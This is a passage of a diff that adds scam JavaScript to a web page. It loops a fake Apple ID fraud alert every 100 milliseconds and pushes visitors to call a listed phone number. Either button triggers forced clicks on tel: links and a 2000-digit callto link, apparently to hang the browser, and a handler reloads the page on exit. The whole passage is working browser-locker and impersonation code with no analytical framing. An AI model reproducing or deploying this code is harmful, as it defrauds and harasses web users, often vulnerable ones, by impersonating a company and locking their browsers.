+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-316-0185"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-833-316-0185 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
